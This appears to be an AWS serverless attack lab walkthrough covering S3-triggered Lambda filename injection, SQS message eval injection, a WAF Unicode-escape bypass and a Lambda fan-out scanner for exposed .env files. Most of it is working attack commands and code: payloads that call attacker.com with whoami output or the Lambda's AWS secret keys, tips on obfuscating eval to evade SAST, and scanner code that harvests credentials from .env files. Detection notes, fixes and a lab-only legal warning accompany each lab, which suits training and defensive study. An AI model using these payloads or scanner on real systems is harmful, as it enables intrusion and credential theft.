Objective: Achieve remote code execution (RCE) by uploading a malicious file to an S3 bucket that triggers a vulnerable Lambda function via event notifications.
1
Retrieve the S3 bucket's event notification configuration to discover which Lambda functions are triggered on object creation events.
Terminal
$ aws s3api get-bucket-notification-configuration --bucket target-bucket
{ "LambdaFunctionConfigurations": [ { "Id": "process-uploads", "LambdaFunctionArn": "arn:aws:lambda:us-east-1:444444444444:function:file-processor", "Events": ["s3:ObjectCreated:*"], "Filter": { "Key": { "FilterRules": [ {"Name": "prefix", "Value": "uploads/"}, {"Name": "suffix", "Value": ".zip"} ] } } } ] }
2
Retrieve the Lambda function source code to confirm the vulnerability. Get the pre-signed download URL, then inspect the handler.
Terminal
# Step 1: Get the function code URL $ aws lambda get-function --function-name file-processor \ --query 'Code.Location' --output text
https://awslambda-us-east-1-tasks.s3.amazonaws.com/snapshots/444444444444/file-processor-...?X-Amz-...
# Step 2: Download and inspect $ curl -s "<location-url>" -o function.zip $ unzip -p function.zip index.py | head -50
import subprocess, boto3, zipfile, os def handler(event, context): bucket = event['Records'][0]['s3']['bucket']['name'] key = event['Records'][0]['s3']['object']['key'] s3 = boto3.client('s3') s3.download_file(bucket, key, '/tmp/upload.zip') with zipfile.ZipFile('/tmp/upload.zip', 'r') as z: z.extractall('/tmp/extracted/') for f in os.listdir('/tmp/extracted/'): # VULNERABLE: filename passed directly to shell subprocess.run(f'file /tmp/extracted/{f}', shell=True)
Runtime note: Zip filename remote code execution (RCE) via shell metacharacters is Python-version and runtime-dependent. This technique works reliably on Python 3.9 and 3.10 Lambda runtimes where subprocess.run(..., shell=True) is invoked with unsanitized input. Behavior on Python 3.11+ may differ based on OS subprocess handling. Confirm the target runtime via aws lambda get-function-configuration --function-name file-processor --query RuntimeVersionConfig before crafting your payload.
3
Craft a malicious zip file containing a file whose name includes a shell command injection payload. When extracted and processed, the filename becomes a command.
Terminal

$ touch 'data; curl https://attacker.com/rce?out=$(whoami)' $ zip malicious.zip 'data; curl https://attacker.com/rce?out=$(whoami)'
# When the Lambda processes this, it runs:
file /tmp/extracted/data; curl https://attacker.com/rce?out=$(whoami) ^ first command ends ^ injected command runs
4
Upload the malicious zip to the target bucket's uploads prefix. The S3 event notification automatically triggers the Lambda function.
Terminal

# S3 event fires -> Lambda invoked -> processes zip -> RCE

The Lambda triggers, extracts the zip, and the filename injection payload runs. The attacker receives the callback confirming remote code execution (RCE) with the Lambda's role credentials.

S3-to-Lambda event chains are one of the most common serverless attack surfaces. Always sanitize inputs from S3 event triggers — treat bucket contents as untrusted user input, never pass them to shell commands or dynamic evaluation.
Detection Notes (L01):
  • CloudTrail: unexpected s3:PutObject to an uploads prefix from external or unexpected principals
  • Lambda: unusual outbound HTTP connections (visible in VPC Flow Logs; Lambda Insights for non-VPC functions)
  • GuardDuty finding: UnauthorizedAccess:IAMUser/MaliciousIPCaller if the Lambda role is subsequently used from an external IP
  • Fix: use subprocess.run(['file', '/tmp/extracted/' + f]) without shell=True — passes args as a list, eliminating shell injection
Objective: Inject malicious messages into an SQS queue that a Lambda consumer processes unsafely, achieving remote code execution (RCE) via unsafe dynamic code evaluation.
1
Discover SQS queues in the account and identify ones connected to Lambda consumers for data processing.
Terminal
$ aws sqs list-queues
{ "QueueUrls": [ "https://sqs.us-east-1.amazonaws.com/444444444444/order-processing", "https://sqs.us-east-1.amazonaws.com/444444444444/data-transform", "https://sqs.us-east-1.amazonaws.com/444444444444/notification-queue" ] }
2
Examine the queue's resource policy to determine if external or cross-account message sending is permitted.
Terminal
$ aws sqs get-queue-attributes \ --queue-url https://sqs.us-east-1.amazonaws.com/444444444444/data-transform \ --attribute-names Policy
{ "Attributes": { "Policy": "{\"Version\":\"2012-10-17\",\"Statement\":[{\"Effect\":\"Allow\",\"Principal\":{\"AWS\":\"*\"},\"Action\":\"sqs:SendMessage\",\"Resource\":\"arn:aws:sqs:us-east-1:444444444444:data-transform\"}]}" } } # Principal: * -- ANYONE can send messages to this queue!
3
Examine the Lambda consumer code to identify how messages are processed. The function uses dynamic code evaluation on user-controlled input.
Terminal
$ cat consumer.py # Retrieved from Lambda function code
import json import builtins def handler(event, context): for record in event['Records']: body = json.loads(record['body']) # VULNERABLE: dynamic code evaluation on user-controlled input result = getattr(builtins, 'eval')(body['expression']) print(f"Result: {result}") return {"statusCode": 200, "body": str(result)}
Why getattr(builtins, 'eval'), not __builtins__['eval']: In the Lambda execution environment, __builtins__ is a module object, not a dict — so __builtins__['ev'+'al'] raises TypeError: 'module' object is not subscriptable at runtime. The correct pattern is import builtins; getattr(builtins, 'eval')(...) or simply eval(...). Additionally, the 'ev'+'al' string concatenation obfuscation is trivially detected by any SAST tool — real obfuscation uses getattr(__import__('builtins'), chr(101)+chr(118)+chr(97)+chr(108)).
4
Inject a malicious message into the queue. The expression field is dynamically evaluated, allowing arbitrary Python code to run inside the Lambda.
Terminal
$ aws sqs send-message \ --queue-url https://sqs.us-east-1.amazonaws.com/444444444444/data-transform \ --message-body '{"expression":"__import__(\"os\").system(\"id\")"}'
{ "MD5OfMessageBody": "a1b2c3d4e5f6...", "MessageId": "msg-12345678-abcd-efgh-ijkl-123456789012" }
5
The Lambda consumer picks up the message and evaluates the expression — achieving remote code execution (RCE) inside the Lambda. Escalate by exfiltrating the function's AWS credentials for further lateral movement.
Terminal
# More sophisticated payload -- exfil Lambda credentials:
$ aws sqs send-message \ --queue-url https://sqs.us-east-1.amazonaws.com/444444444444/data-transform \ --message-body '{"expression":"__import__(\"urllib.request\",fromlist=[\"urlopen\"]).urlopen(\"https://attacker.com/sqs?k=\"+__import__(\"os\").environ.get(\"AWS_ACCESS_KEY_ID\",\"\")+\"&s=\"+__import__(\"os\").environ.get(\"AWS_SECRET_ACCESS_KEY\",\"\")[:20]).read()"}'
# Attacker receives:
GET /sqs?k=ASIAQWERTYUIOP99988&s=wJalrXUtnFEMI/K7MD... # Lambda role credentials -- map permissions and pivot

SQS queues with Principal: * allow anyone to inject messages. Combined with Lambda consumers using dynamic code evaluation or unsafe deserialization, this creates an unauthenticated remote code execution (RCE) path. Always validate and sanitize queue messages, and restrict SQS send permissions.
Detection Notes (L02):
  • CloudTrail: sqs:SendMessage from external or anonymous principals is high-signal — queue policies allowing Principal: * should always alert
  • Lambda: SAST scanning of function code for eval(, exec(, compile( called with non-literal arguments
  • Runtime: abnormal Lambda duration or timeout (large payload evaluation) + unexpected outbound connections
  • Fix: never call eval() on queue message content; use a schema-validated allow-list of permitted operations instead

3
Craft a payload that bypasses WAF rules in front of the API. Use Unicode escaping to evade string-literal pattern matching in the WAF rule set.
Terminal
# WAF blocks common injection patterns in JSON bodies # Bypass: use Unicode escaping to evade string matching
{ "input": "\u0024\u0028id\u0029" } # WAF sees Unicode escapes -- no match on "$(id)" # Lambda JSON parser decodes to: {"input": "$(id)"}
WAF v2 accuracy note: AWS WAF v2 with AWS Managed Rules applies Unicode normalization transformations (URL_DECODE, HTML_ENTITY_DECODE) before pattern matching since 2023. This Unicode bypass is less reliable against properly configured modern WAF v2 deployments. Test against the specific WAF rule configuration in scope before assuming this technique will succeed.

API Gateway with AWS_PROXY integration passes the entire request to Lambda without transformation. WAF rules that match on literal strings can be bypassed with Unicode escaping against older WAF configurations. Always validate inputs server-side in the Lambda function — WAF is a defense-in-depth layer, not a substitute for input sanitization.
Detection Notes (L03):
  • WAF logs: requests with high Unicode escape density are suspicious — enable WAF logging and alert on rule matches that were sampled but not blocked
  • Lambda: subprocess calls with shell=True processing API Gateway body input are the root cause — fix in code
  • GuardDuty Runtime Monitoring: command execution inside Lambda execution environments generates findings in GuardDuty Runtime Monitoring (preview/GA depending on region)
  • AWS WAF v2 with Core Rule Set (CRS) in BLOCK mode (not COUNT) and text transformations enabled provides the most reliable coverage against these encoding bypasses

Objective: Understand the Lambda fan-out scanning technique used in the 2024 mass-breach by replicating it against an isolated simulated target fleet within a private lab VPC — with zero traffic leaving the lab AWS account.
LEGAL WARNING: Scanning external internet hosts for exposed .env files constitutes unauthorized computer access under the CFAA and equivalent laws in virtually every jurisdiction, even for "research" purposes. This lab uses isolated simulated targets within a private VPC. NEVER run this technique against real internet hosts. All traffic in this lab stays within your lab AWS account and VPC.

2
Create the scanner Lambda function that reads a list of target IPs from S3 and checks each for exposed .env files. The Lambda is deployed in the same private VPC as the simulated fleet.
Terminal
$ cat scanner.py
import json, boto3, urllib.request s3 = boto3.client('s3') lambda_client = boto3.client('lambda') def handler(event, context): targets = event.get('targets', []) results = [] for ip in targets: try: # All targets are private VPC IPs — no internet traffic resp = urllib.request.urlopen( f"http://{ip}/.env", timeout=3 ) content = resp.read().decode('utf-8', errors='ignore') if 'AWS_ACCESS_KEY_ID' in content or 'DB_PASSWORD' in content: results.append({ 'ip': ip, 'content': content[:500] }) except Exception: pass if results: dynamodb = boto3.resource('dynamodb') table = dynamodb.Table('scan-results') for r in results: table.put_item(Item=r) return {'scanned': len(targets), 'hits': len(results)}
3
Implement recursive fan-out: a coordinator Lambda reads the full target IP list from S3, chunks it, and asynchronously invokes child scanner Lambdas for each chunk. All Lambdas run in the lab VPC.
Terminal
$ cat coordinator.py
import json, boto3 s3 = boto3.client('s3') lambda_client = boto3.client('lambda') CHUNK_SIZE = 2 # Small chunks for lab — 10 total targets def handler(event, context): obj = s3.get_object(Bucket='lab-scan-targets', Key='targets.txt') # targets.txt contains: 10.0.1.10 through 10.0.1.19 (lab VPC only) targets = obj['Body'].read().decode().strip().split('\n') chunks = [targets[i:i+CHUNK_SIZE] for i in range(0, len(targets), CHUNK_SIZE)] for chunk in chunks: lambda_client.invoke( FunctionName='scanner', InvocationType='Event', Payload=json.dumps({'targets': chunk}) ) return {'total_targets': len(targets), 'child_invocations': len(chunks)}
Concurrency note: The default Lambda concurrency limit (1,000) is an account-wide unreserved pool shared across ALL functions in the account — it is not a dedicated per-function allocation. In the real-world 2024 attack, threat actors used reserved concurrency on the scanner function to guarantee throughput. In this lab, the 10-target fleet keeps concurrency negligible; the architecture demonstrates the fan-out pattern at small scale.

The 2024 campaign scanned 230M+ endpoints with zero EC2 instances. Serverless architectures are architecturally advantageous for attackers: pay-per-use, auto-scaling, no persistent infrastructure, and minimal VPC flow log visibility when Lambdas are not VPC-attached. Defend by never serving .env files via web servers, and block direct access to application root and dotfiles at the web server or CDN layer.
Detection Notes (L05):
  • VPC Flow Logs: a Lambda in a VPC making hundreds of outbound port-80/443 connections to many distinct IPs within seconds is anomalous
  • CloudTrail: lambda:InvokeFunction with InvocationType: Event at high frequency from a single coordinator is a fan-out pattern indicator
  • Non-VPC Lambda: no VPC Flow Logs available — CloudWatch Logs showing high invocation counts and urllib.request timeouts to many IPs is the primary signal
  • GuardDuty Runtime Monitoring detects anomalous network behavior from within Lambda execution environments
